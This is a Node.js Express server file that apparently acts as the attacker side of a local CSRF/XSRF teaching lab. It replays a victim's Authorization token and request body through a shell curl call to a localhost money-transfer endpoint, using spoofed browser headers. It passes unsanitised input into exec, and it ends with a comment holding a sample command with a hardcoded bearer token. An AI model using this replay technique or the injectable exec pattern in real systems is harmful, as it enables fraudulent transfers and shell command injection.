import express from 'express';
import { exec } from 'child_process';

import cors from 'cors';

const app = express();
const port = 2525;

const allowedOrigins = ['http://localhost:8888'];

app.use(
  cors({
    origin: (origin, callback) => {
      if (!origin || allowedOrigins.includes(origin)) {
        callback(null, true);
      } else {
        callback(new Error('Not allowed by CORS'));
      }
    },
  })
);

app.use(express.json());

app.post('/attack', (req, res) => {
  const authorization = req.headers.authorization;
  const body = req.body || {};

  // * Path and referer are already known
  // * sec-ch-ua-platform is arbitrary
  // * sec-ch-ua is arbitrary
  // * sec-ch-ua-mobile is arbitrary
  // * please remove -unsafe in url if want to test that xsrf token is working or not
  const curl = `curl -s -S 'http://localhost:8000/transaction/transfer-unsafe' -H 'sec-ch-ua-platform: "Windows"' -H 'Authorization: ${authorization}' -H 'Referer: http://localhost:8888/' -H 'sec-ch-ua: "Microsoft Edge";v="143", "Chromium";v="143", "Not A(Brand";v="24"' -H 'sec-ch-ua-mobile: ?0' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0' -H 'Accept: application/json, text/plain, */*' -H 'Content-Type: application/json' --data-raw '${JSON.stringify(
    body
  )}'`;

  console.log(curl);

  return exec(curl, (error, stdout, stderr) => {
    console.log({ error, stderr, stdout }, '<<');
    if (error) {
      res.status(400).json({ message: 'ERROR', error });
      console.error(`Execution error: ${error.message}`);
      return;
    }
    if (stderr) {
      res.status(400).json({ message: 'ERROR', stderr });
      console.error(`Stderr output: ${stderr}`);
      return;
    }
    const json = JSON.parse(stdout || '{}');
    if (json?.status === 401) {
      return res.status(401).json(json);
    }
    console.log(`API response: ${stdout}`);
    return res.status(200).json({ message: 'OK' });
  });
});
app.get('/', (req, res) => {
  return res.status(200).json({ message: 'OK' });
});

app.listen(port, () => {
  console.log('HELLO');
});
// curl 'http://localhost:8000/transaction/transfer-unsafe' -H 'sec-ch-ua-platform: "Windows"' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwiZW1haWwiOiJwYW50YWxvbmVAZmF0dWkub3IucnUiLCJpYXQiOjE3NjQzMTMwNTl9.vpIAs_P5Ptj3Whm1qMAgZ8TCrsdBot4V8IdvpFf2-W0' -H 'Referer: http://localhost:8888/' -H 'sec-ch-ua: "Microsoft Edge";v="143", "Chromium";v="143", "Not A(Brand";v="24"' -H 'sec-ch-ua-mobile: ?0' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36 Edg/143.0.0.0' -H 'Accept: application/json, text/plain, */*' -H 'Content-Type: application/json' --data-raw '{"account_number":8765432112345678,"amount":200000}'
